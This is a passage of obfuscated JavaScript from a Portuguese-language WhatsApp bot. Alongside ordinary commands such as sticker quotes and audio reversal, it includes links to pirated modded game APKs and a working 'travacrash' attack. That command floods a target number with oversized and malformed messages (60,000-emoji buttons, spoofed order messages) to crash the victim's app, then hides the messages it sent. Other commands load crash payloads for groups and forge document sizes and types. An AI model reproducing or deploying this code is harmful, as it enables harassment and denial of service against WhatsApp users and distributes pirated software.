              const _0x1552c7 = {
                id: 1,
                name: _0x2e4d91,
                photo: _0x2797fa
              };
              const _0x36a692 = {
                entities: [],
                avatar: true,
                from: _0x1552c7,
                text: _0x1e7f7f,
                replyMessage: {}
              };
              const _0x4ea241 = {
                type: "quote",
                format: "png",
                backgroundColor: "#1f2c34",
                width: 512,
                height: 768,
                scale: 2,
                messages: [_0x36a692]
              };
              const _0x3ada19 = _0x4ea241;
              axios.post("https://bot.lyo.su/quote/generate", _0x3ada19, {
                headers: {
                  "Content-Type": "application/json"
                }
              }).then(_0x57c234 => {
                const _0x18c119 = Buffer.from(_0x57c234.data.result.image, "base64");
                const _0x4fc612 = {
                  packname: "🗣 ⇝ Solicitado por:\n🤖 ⇝ Bot:\n🧙‍ ⇝ Dono:\n🔗 ⇝ Site: bit.ly/bots-whats",
                  author: "🗣" + _0x55a6ac + "\n🤖" + NomeDoBot + "\n🧙‍" + NickDono
                };
                _0x263319.sendImageAsSticker(_0x4f1071, _0x18c119, _0x302296, _0x4fc612);
                setTimeout(async () => {
                  fs.writeFile("Quotly.png", _0x18c119, _0x4617d3 => {
                    if (_0x4617d3) {
                      return console.log(_0x4617d3);
                    }
                  });
                }, 3000);
              });
              break;
            case "reverse":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602(enviar.espere);
              muk = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              rane = getRandom("." + (await getExtension(muk.mimetype)));
              buffimg = await getFileBuffer(muk, "audio");
              fs.writeFileSync(rane, buffimg);
              gem = rane;
              ran = getRandom(".mp3");
              exec("ffmpeg -i " + gem + " -filter_complex \"areverse\" " + ran, (_0x2d81ba, _0x340494, _0x334bf9) => {
                fs.unlinkSync(gem);
                if (_0x2d81ba) {
                  return _0x403602("Error!");
                }
                hah = fs.readFileSync(ran);
                const _0x4ef93f = {
                  audio: hah,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x143620 = {
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, _0x4ef93f, _0x143620);
                fs.unlinkSync(ran);
              });
              break;
            case "loli":
              {
                _0x403602("aguarde um momento, enviando se demorar demais e pq nao encontrei a foto...");
                waifuddd = await axios.get("https://waifu.pics/api/sfw/shinobu");
                var _0x2de984 = [{
                  buttonId: "-loli",
                  buttonText: {
                    displayText: ">>"
                  },
                  type: 1
                }];
                const _0x18dcfc = {
                  url: waifuddd.data.url
                };
                const _0x1d606d = {
                  image: _0x18dcfc,
                  caption: "vc e um(a) lolicon?🤔!",
                  headerType: 2
                };
                let _0xdc52b2 = _0x1d606d;
                const _0x1f22f3 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0xdc52b2, _0x1f22f3).catch(_0x2e8d90 => {
                  return "error..";
                });
              }
              break;
            case "getcase":
            case "pegarcase":
            case "getcmd":
            case "pegarcmd":
              const _0x3e2873 = "break";
              {
                if (!_0x2a5ff3 && !msg.key.fromMe) {
                  return _0x403602("Só meu dono");
                }
                if (!_0x40e45c[0]) {
                  return _0x403602("Qual o case que você deseja pegar?");
                }
                try {
                  _0x403602("case " + ("'" + _0x40e45c[0] + "'") + fs.readFileSync("./index.js").toString().split("case '" + _0x40e45c[0] + "'")[1].split(_0x3e2873)[0] + _0x3e2873);
                } catch (_0x4e0812) {
                  console.error(_0x4e0812);
                  _0x403602(" Erro, talvez esse case não exista");
                }
              }
              break;
            case "reversetxt":
              {
                if (_0x40e45c.length < 1) {
                  return _0x403602("*[🔹] EXEMPLO:*\n.reversetxt xbot e o melhor");
                }
                quere = _0x40e45c.join(" ");
                flipe = quere.split("").reverse().join("");
                _0x403602("\n\n║❯         〘 REVERTER TEXTO 〙\n\n\n┠❯ ❒ TEXTO: " + _0x1d6557 + "\n┠\n┠❯ ❒ REVERSO: " + flipe + "\n\n\n");
              }
              break;
              break;
            case "jogo1":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *DragonBall Z - Dokkan:* https://www.mediafire.com/file/015ibjiljfkv7uo/Dokkan_v4_12_1_MOD.apk/file\n");
              break;
            case "jogo2":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *GTA SanAndreas:* https://www.mediafire.com/file/ln6r3kx0ie77r9t/GTA_San_Andreas_2021.zip/file\n");
              break;
            case "jogo3":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *GTA SA - Legendado em Português:* http://www.mediafire.com/file/7op13aup1ll7m9y/GTA_SA_COM_TRADU%25C3%2587%25C3%2583O_PT-BR.zip/file\n");
              break;
            case "jogo4":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *GTA SA com Mod Cleo:* http://www.mediafire.com/file/d8cfwzctx95x0dx/GTA_SA_v2.00_Mod_Cleo.zip/file\n");
              break;
            case "jogo5":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *GTA SA Online:* https://www.mediafire.com/file/0xccd5m0zwqstag/GTA_SA_ONLINE_SAMP_ByHT.zip/file\n");
              break;
            case "jogo6":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *GTA SuperLite + Mod Cleo:* http://www.mediafire.com/file/wdkg8pmndtihil3/GTA_SA_super_lite_mod_cleo_ByHT.zip/file\n");
              break;
            case "jogo7":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *LastDay on Eart Survival:* https://www.mediafire.com/file/k4pr6awvr5eb1ak/Last%20Day%20on%20Earth%201.17.7-mod.apk/file \n");
              break;
            case "jogo8":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Bomber Friends MOD:* https://www.mediafire.com/file/dir8pwrb1mpm57w/Bomber_Friends_v4.10_MOD.apk/file\n");
              break;
            case "jogo9":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Arcade Hunter:* https://www.mediafire.com/file/ugcdaclnpodtxxs/Arcade_Hunter-Sword%252CGun%252C_and_Magic_1.11.0-mod.apk/file\n");
              break;
            case "jogo10":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Defesa de Zombie Ocioso:* https://www.mediafire.com/file/8422sjofw1cdnka/Zombie+Idle+Defense+1.5.79.229MOD-t.apk/file\n");
              break;
            case "jogo11":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Pac-Man:* https://www.mediafire.com/file/gxwy01ni99pcur2/PAC-MAN+9.2.7.10150MOD-t.apk/file\n");
              break;
            case "jogo12":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Car Driving School Simulator - APK:* https://www.mediafire.com/file/r6aps8mn6wqoabj/Car+Driving+School+Simulator+3.1.0.283MOD-t.apk/file\n🎳 _Obrigatório instalar o OBB:_\n\xA0https://www.mediafire.com/file/hcsb5tpr7byh8fg/com.boombitgames.DrivingSchoolParking.zip/file\n");
              break;
            case "jogo12":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Cyber Fighters Premium:* https://www.mediafire.com/file/4tmv2cdahvqamlx/Cyber+Fighters+Premium+1.11.35.68MOD-t.apk/file\n");
              break;
            case "jogo13":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳️ *Drag Racing:* https://www.mediafire.com/file/g88v399ks1fpnfq/drag-racing-mod_2.0.37.rar/file\n");
              break;
            case "jogo14":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Mr. Brow:* https://www.mediafire.com/file/i0ii099sejk9fnk/Mr+Bow+4.15.75MOD-t.apk/file\n");
              break;
            case "jogo15":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Airport City:* https://www.mediafire.com/file/vuupmpp3r03lso0/Airport+City+8.7.18.101418MOD-t.apk/file\n");
              break;
            case "jogo16":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Crash Bandicoot:* https://www.mediafire.com/file/nyx8rjqn5m51o3r/Crash+Bandicoot+Mobile+v0.7.6242+Mod.apk/file \n");
              break;
            case "jogo17":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Real Steel World Robot Boxing (APK+OBB):* https://www.mediafire.com/file/zcnsxb55mldn51e/Real+Steel+World+Robot+Boxing+v54.54.126+Mod.apk/file\n");
              break;
            case "jogo18":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Anger of Sticker:* https://www.mediafire.com/file/zfmqmszkhbgoem2/anger-of-stick-5-mod_1.1.39.apk/file\n");
              break;
            case "jogo19":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Angry Birds 2 (APK+OBB)*\nhttps://www.mediafire.com/file/uwnurszwrdbv5ge/angrybirds2-2481.apk/file\n");
              break;
            case "jogo20":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳️ *Especial Force Group 2 (CS):* https://www.mediafire.com/file/uwf5cq9u8tjg44x/specialforcesgroup2-421.apk/file\n");
              break;
            case "jogo21":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳️ *Roblox:* https://apkadmin.com/k05ck2q6ioo1/ROBLOX_v2.459.415955_MOD_MENU.apk.html\n");
              break;
            case "jogo22":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Critical Striker:* https://www.mediafire.com/file/7yqmk1gn4wrieri/CRITICAL_STRIKE.zip/file\n");
              break;
            case "jogo23":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Dream League Soccer:* http://www.mediafire.com/file/yuw9n5d4phzz5wg/Dream_League_Soccer_2019_v6.13-mod.apk/file\n");
              break;
            case "jogo24":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Clash of Clans:* http://www.mediafire.com/file/aoaem76tyg0hvfv/Clash_Of_Clans_v13.675.6_MOD.apk/file\n");
              break;
            case "jogo25":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Criminal Case Paris:* http://www.mediafire.com/fil...e/i5pbv8d7yjbbtly/Criminal%20Case%20Paris%20v2.36.1-mod.apk/file\n");
              break;
            case "jogo26":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Drift Max World:* https://www.mediafire.com/file/hqui6asekutsocq/DRIFT+MAX+WORLD+DINHEIRO+INFINITO.zip/file");
              break;
            case "jogo27":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Downhill Masters:* https://www.mediafire.com/file/9cdgreyc8amkto9/Downhill_Masters_v1.0.59_MOD.apk/file");
              break;
            case "jogosamp":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n☕ IP DO SERVIDOR PRA JOGAR: 23.88.73.88:11627\n\n🎳 *SA-MP:* https://play.google.com/store/apps/details?id=ru.unisamp_mobile.launcher");
              break;
            case "jogo28":
              await _0x403602("Olá " + _0x55a6ac + ", aqui está o seu pedido, espero que você goste!\n🪀 *Número:* @" + _0x32e455.split("@")[0] + "\n\n🎳 *Monopoly:* https://www.mediafire.com/file/q5jfi61xwbqiu2x/Monopoly-v1-7-11-mod.zip/file");
              break;
            case "suicidagp":
            case "matargp":
            case "crashgp":
            case "crashgrupo":
              const {
                buttonkal: _0x3326e7
              } = require("./armor/funcoes/buttonkal.js");
              const {
                travavideo: _0x190240
              } = require("./armor/funcoes/travavideo.js");
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              _0x403602("『🎉』@JEFFERSON_DDOS 𝚯͢𝑭𝑭 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ");
              const _0x38d33a = {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "0@g.us"
              };
              const _0x6c4a72 = {
                itemCount: 1397,
                status: 200,
                jpegThumbnail: null,
                surface: 200,
                message: _0x3326e7 + "\n" + _0x190240,
                orderTitle: "❔🤣",
                sellerJid: "0@s.whatsapp.net"
              };
              const _0xf47f8d = {
                orderMessage: _0x6c4a72
              };
              const _0x446d89 = {
                forwardingScore: 999,
                isForwarded: true
              };
              const _0x401481 = {
                key: _0x38d33a,
                message: _0xf47f8d,
                contextInfo: _0x446d89,
                sendEphemeral: true
              };
              let _0x57ea1d = _0x401481;
              const _0x4479e0 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: "『🎉』@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ"
              }, _0x4479e0);
              break;
            case "travacrash":
              try {
                if (!_0x2a5ff3) {
                  return _0x403602("Quem é você? SO SONO --_--");
                }
                if (_0x1d6557 && _0x40e45c[0] === "-fake") {
                  teks = "";
                  for (var _0xc3d45a = 0; _0xc3d45a < 10; _0xc3d45a++) {
                    teks += "💤";
                  }
                  tekks = "";
                  for (var _0xc3d45a = 0; _0xc3d45a < 100; _0xc3d45a++) {
                    tekks += "؅؀؁؂؃؄";
                  }
                  tekkss = "";
                  for (var _0xc3d45a = 0; _0xc3d45a < 800; _0xc3d45a++) {
                    tekkss += "‍";
                  }
                  const _0x3f08b6 = {
                    displayText: teks
                  };
                  const _0x21b634 = {
                    buttonId: "ꪶ͢͜😈@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟😈ꫂ",
                    buttonText: _0x3f08b6,
                    type: 1
                  };
                  const _0x479c26 = {
                    displayText: teks
                  };
                  const _0x1c2941 = {
                    buttonId: "ꪶ͢͜💦@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟💦ꫂ",
                    buttonText: _0x479c26,
                    type: 1
                  };
                  const _0x57fc94 = {
                    displayText: teks
                  };
                  const _0x4a3be7 = {
                    buttonId: "ꪶ͢͜🌈@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟🌈ꫂ",
                    buttonText: _0x57fc94,
                    type: 1
                  };
                  let _0x29b6f3 = [_0x21b634, _0x1c2941, _0x4a3be7];
                  const _0x16250d = {
                    forwardingScore: 999,
                    isForwarded: true
                  };
                  const _0x287256 = {
                    text: "@JEFFERSON_DDOS DOMINA " + tekkss + tekks,
                    buttons: _0x29b6f3,
                    footer: "e outros 101631 caracteres",
                    contextInfo: _0x16250d
                  };
                  fuck = _0x287256;
                  const _0x3eeec1 = {
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "120363022697760691@g.us"
                  };
                  const _0x4b9cf9 = {
                    itemCount: -666,
                    status: 200,
                    jpegThumbnail: null,
                    surface: 200,
                    message: teks,
                    orderTitle: "❔🤣",
                    sellerJid: "0@s.whatsapp.net"
                  };
                  const _0x2d010d = {
                    orderMessage: _0x4b9cf9
                  };
                  const _0x7c321a = {
                    forwardingScore: 999,
                    isForwarded: true
                  };
                  const _0xb7c153 = {
                    key: _0x3eeec1,
                    message: _0x2d010d,
                    contextInfo: _0x7c321a,
                    sendEphemeral: true
                  };
                  let _0x38f39c = _0xb7c153;
                  const _0x22f76f = {
                    quoted: _0x38f39c
                  };
                  ABC = await _0x263319.sendMessage(_0x4f1071, fuck, _0x22f76f);
                  const _0x9264f6 = {
                    id: abc.key.id,
                    fromMe: true,
                    timestamp: abc.messageTimestamp.low
                  };
                  const _0x31c6bd = {
                    messages: [_0x9264f6]
                  };
                  const _0x333c5a = {
                    clear: _0x31c6bd
                  };
                  await _0x263319.chatModify(_0x333c5a, abc.key.remoteJid, []);
                  return;
                }
                try {
                  vacilao = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid[0] ? _0x302296.message.extendedTextMessage.contextInfo.mentionedJid[0] : _0x302296.message.extendedTextMessage.contextInfo.participant;
                } catch {
                  if (_0x1d6557.includes("/")) {
                    vacilao = _0x1d6557.split("/")[0] || "";
                  } else {
                    vacilao = "" + _0x40e45c.join(" ").replace(/\D/g, "");
                  }
                }
                try {
                  envi = _0x1d6557.split("/")[1].replace(/\D/g, "") || 1;
                } catch {
                  envi = 5;
                }
                let _0x2a4638 = "" + vacilao.replace(/\D/g, "");
                if (!_0x2a4638) {
                  return _0x403602("Cade o número?");
                }
                let [_0x4d1f2e] = await _0x263319.onWhatsApp(_0x2a4638);
                if (!_0x4d1f2e) {
                  return _0x403602("Numero inexistente!");
                }
                teks = "";
                for (var _0xc3d45a = 0; _0xc3d45a < 60000; _0xc3d45a++) {
                  teks += "💤";
                }
                const _0xf678f0 = {
                  displayText: teks
                };
                const _0x9d26eb = {
                  buttonId: "ꪶ͢͜😈@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟😈ꫂ",
                  buttonText: _0xf678f0,
                  type: 1
                };
                const _0x341f31 = {
                  displayText: teks
                };
                const _0x43043d = {
                  buttonId: "ꪶ͢͜💦@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟💦ꫂ",
                  buttonText: _0x341f31,
                  type: 1
                };
                const _0x2276fd = {
                  displayText: teks
                };
                const _0x292926 = {
                  buttonId: "ꪶ͢͜🌈@JEFFERSON_DDOS 𝐃𝚯𝐌𝐈𝐍𝜟🌈ꫂ",
                  buttonText: _0x2276fd,
                  type: 1
                };
                let _0x3f5f32 = [_0x9d26eb, _0x43043d, _0x292926];
                const _0xd85273 = {
                  forwardingScore: 999,
                  isForwarded: true
                };
                const _0x2a3536 = {
                  text: "@JEFFERSON_DDOS  TERROR DA WEB",
                  buttons: _0x3f5f32,
                  footer: "e outros 101631 caracteres",
                  contextInfo: _0xd85273
                };
                fuck = _0x2a3536;
                const _0x465db3 = {
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "0@g.us"
                };
                const _0x2c4f98 = {
                  itemCount: -666,
                  status: 200,
                  jpegThumbnail: null,
                  surface: 200,
                  message: teks,
                  orderTitle: "❔🤣",
                  sellerJid: "0@s.whatsapp.net"
                };
                const _0x120648 = {
                  orderMessage: _0x2c4f98
                };
                const _0x466fd8 = {
                  forwardingScore: 999,
                  isForwarded: true
                };
                const _0x560a14 = {
                  key: _0x465db3,
                  message: _0x120648,
                  contextInfo: _0x466fd8,
                  sendEphemeral: true
                };
                let _0x1fa617 = _0x560a14;
                for (var _0xc3d45a = 0; _0xc3d45a < Number(envi); _0xc3d45a++) {
                  const _0x14b031 = {
                    quoted: _0x1fa617
                  };
                  ABC = await _0x263319.sendMessage(_0x4d1f2e.jid, fuck, _0x14b031);
                  const _0x3f4052 = {
                    id: abc.key.id,
                    fromMe: true,
                    timestamp: abc.messageTimestamp.low
                  };
                  const _0x276c8a = {
                    messages: [_0x3f4052]
                  };
                  const _0x1e5035 = {
                    clear: _0x276c8a
                  };
                  await _0x263319.chatModify(_0x1e5035, abc.key.remoteJid, []);
                  await sleep(500);
                }
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Enviei " + envi + " travas para @" + _0x4d1f2e.jid.split("@")[0],
                  mentions: [_0x4d1f2e.jid]
                });
              } catch (_0x3933db) {
                console.log(_0x3933db);
                _0x403602("Hmm deu algum erro!!");
              }
              break;
            case "grupo-suporte":
              _0x403602("link do grupo de suporte para os vips foi Enviado no seu pv");
              only8 = "\n    🎗️GRUPO DE SUPORTE PARA USUARIOS VIPS🎗️\n\n-> LINK: https://chat.whatsapp.com/J1k1INmgsYeCDWR8ZmF0oZ\n";
              const _0x176444 = {
                text: only8
              };
              const _0x4319c7 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x32e455, _0x176444, _0x4319c7);
              break;
            case "grupo_figurinhas":
              only8 = "\n    👻️GRUPO DE FIGURINHFIGURINHAS👻\n\n-> LINK: https://chat.whatsapp.com/D9rolE8vOnn0B8sFo7JdaV\n";
              const _0x44763b = {
                text: only8
              };
              const _0x1e8939 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x44763b, _0x1e8939);
              break;
            case "docfake":
              try {
                var _0x360e77 = "/";
                if (!_0x1d6557) {
                  let _0x2c320b = {
                    document: fs.readFileSync("./DADOS/DADOS/docf.txt"),
                    mimetype: "application/vnd.android.package-archive",
                    fileName: "exemplo",
                    fileLength: 500000000,
                    caption: _0x1d93be + _0x3dec88 + " exemplo" + _0x360e77 + "500" + _0x360e77 + "apk\n\nOs tipos aceitos por enquanto são:\n( caso tenha algum tipo de documento que queira que não esteja ai, por favor use /dono e mande o tipo do documento!! )\n\n> doc\n> docx\n> pdf\n> xml\n> zip\n> jpg\n> ppt\n> apk\n> txt\n> aac\n> pptx\n> aac\n> csv\n> m4a\n> mp4\n> mp3\n> svg\n> png\n> js\n> xls\n> xlsx\n> rtf\n",
                    headerType: 4
                  };
                  const _0x17029f = {
                    quoted: _0x302296
                  };
                  return _0x263319.sendMessage(_0x4f1071, _0x2c320b, _0x17029f);
                }
                var _0x22c0cc = _0x40e45c.join(" ");
                let _0x15c3d4 = _0x22c0cc.split(_0x360e77)[0] || "" + NomeBot;
                let _0x5358cf = _0x22c0cc.split(_0x360e77)[1] * 1000000 || "1000000";
                let _0x63e0bb = _0x22c0cc.split(_0x360e77)[2].replace(" ", "") || "gif";
                let _0x129ed7 = _0x22c0cc.split(_0x360e77)[3] || "https://google.com/";
                if (_0x63e0bb.toLowerCase() == "pdf") {
                  _0x63e0bb = "application/pdf";
                }
                if (_0x63e0bb.toLowerCase() == "apk") {
                  _0x63e0bb = "application/vnd.android.package-archive";
                }
                if (_0x63e0bb.toLowerCase() == "aac") {
                  _0x63e0bb = "audio/aac";
                }
                if (_0x63e0bb.toLowerCase() == "xml") {
                  _0x63e0bb = "application/xml";
                }
                if (_0x63e0bb.toLowerCase() == "js") {
                  _0x63e0bb = "application/javascript";
                }
                if (_0x63e0bb.toLowerCase() == "xls") {
                  _0x63e0bb = "application/vnd.ms-excel";
                }
                if (_0x63e0bb.toLowerCase() == "rtf") {
                  _0x63e0bb = "application/rtf";
                }
                if (_0x63e0bb.toLowerCase() == "zip") {
                  _0x63e0bb = "application/zip";
                }
                if (_0x63e0bb.toLowerCase() == "jpg") {
                  _0x63e0bb = "image/jpeg";
                }
                if (_0x63e0bb.toLowerCase() == "ppt") {
                  _0x63e0bb = "application/vnd.ms-powerpoint";
                }
                if (_0x63e0bb.toLowerCase() == "pptx") {
                  _0x63e0bb = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
                }
                if (_0x63e0bb.toLowerCase() == "mp4") {
                  _0x63e0bb = "video/mp4";
                }
                if (_0x63e0bb.toLowerCase() == "m4a") {
                  _0x63e0bb = "audio/mp4";
                }
                if (_0x63e0bb.toLowerCase() == "mp3") {
                  _0x63e0bb = "audio/mpeg";
                }
                if (_0x63e0bb.toLowerCase() == "docx") {
                  _0x63e0bb = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
                }
                if (_0x63e0bb.toLowerCase() == "gif") {
                  _0x63e0bb = "image/gif";
                }
                if (_0x63e0bb.toLowerCase() == "png") {
                  _0x63e0bb = "image/png";
                }
                if (_0x63e0bb.toLowerCase() == "svg") {
                  _0x63e0bb = "image/svg+xml";
                }
                if (_0x63e0bb.toLowerCase() == "txt") {
                  _0x63e0bb = "text/plain";
                }
                if (_0x63e0bb.toLowerCase() == "csv") {
                  _0x63e0bb = "text/csv";
                }
                if (_0x63e0bb.toLowerCase() == "docx") {
                  _0x63e0bb = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
                }
                if (_0x63e0bb.toLowerCase() == "xlsx") {
                  _0x63e0bb = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
                }
                if (_0x63e0bb.toLowerCase() == "doc") {
                  _0x63e0bb = "application/msword";
                }
                const _0x13d208 = {
                  forwardingScore: 999,
                  isForwarded: true
                };
                let _0xf8e5ce = {
                  document: fs.readFileSync("./DADOS/docf.txt"),
                  mimetype: _0x63e0bb,
                  jpegThumbnail: await getBuffer(_0x129ed7),
                  fileName: _0x15c3d4,
                  fileLength: _0x5358cf,
                  headerType: 4,
                  contextInfo: _0x13d208
                };
                const _0x57f378 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0xf8e5ce, _0x57f378);
              } catch (_0x43eff2) {
                console.log(_0x43eff2);
                enviar("vish ocorreu um erro");
              }
              break;
            case "tempodesair":
              if (!_0x2a5ff3) {
                return;
              }
              txt = _0x40e45c.join(" ");
              if (!txt.includes("/")) {
                return _0x403602("O formato da data é assim : 03/04/22");
              }
              msgz = _0x40e45c.join(" ").replace(" ", "");
              datinhaofc = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
              const _0x212684 = {
                Data_que_alugou: datinhaofc,
                Data_de_sair: msgz
              };
              var _0x52dc1a = _0x212684;
              if (!fs.existsSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json")) {
                fs.writeFileSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json", JSON.stringify(_0x52dc1a, null, 2));
              } else if (fs.existsSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json")) {
                fs.unlinkSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json");
                fs.writeFileSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json", JSON.stringify(_0x52dc1a, null, 2));
              }
              _0x403602("Tempo de quando vai expirar o aluguel do bot e irei sair na data exata..");
              break;
            case "tempo-fgp":
              if (!_0x2a5ff3) {
                return;
              }
              txt = _0x40e45c.join(" ").replace(" |", "|").replace("| ", "|");
              var [_0x3a7079, _0x137400] = txt.split("|");
              const _0x375c14 = {
                fechargp: _0x3a7079,
                abrirgp: _0x137400,
                grupoid: _0x4f1071
              };
              var _0x52dc1a = _0x375c14;
              if (!fs.existsSync("./DADOS/fgrupo/fgp-" + _0x4f1071 + ".json")) {
                fs.writeFileSync("./DADOS/fgrupo/fgp-" + _0x4f1071 + ".json", JSON.stringify(_0x52dc1a, null, 2));
              } else if (fs.existsSync("./DADOS/fgrupo/fgp-" + _0x4f1071 + ".json")) {
                fs.unlinkSync("./DADOS/fgrupo/fgp-" + _0x4f1071 + ".json");
                fs.writeFileSync("./DADOS/fgrupo/fgp-" + _0x4f1071 + ".json", JSON.stringify(_0x52dc1a, null, 2));
              }
              _0x403602("Tempo determinado..");
              break;
            case "abrir-fechar":
              if (!_0xd20756) {
                return _0x403602(resposta.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(resposta.adm);
              }
              if (!_0x5550bd) {
                return _0x403602(resposta.botadm);
              }
              if (!_0x1d6557.includes("/") && !_0x1d6557.length <= 17) {
                return _0x403602("Olá, você tem que determinar os 2 tempo pra o bot abrir o grupo e fechar, por exemplo..\n" + _0x1d93be + "abrir-fechar 2m/1m\n\nEle abrirar o grupo depois de um minuto, e depois fecha após 2 minutos....");
              }
              qtxt = _0x40e45c.join(" ").replace(" /", "/").replace("/ ", "/").replace("1m", "60000").replace("2m", "120000").replace("3m", "180000").replace("30m", "1800000").replace("1h", "3600000").replace("2h", "7200000").replace("7h", "25200000");
              _0x3a7079 = qtxt.split("/")[0];
              _0x137400 = qtxt.split("/")[1];
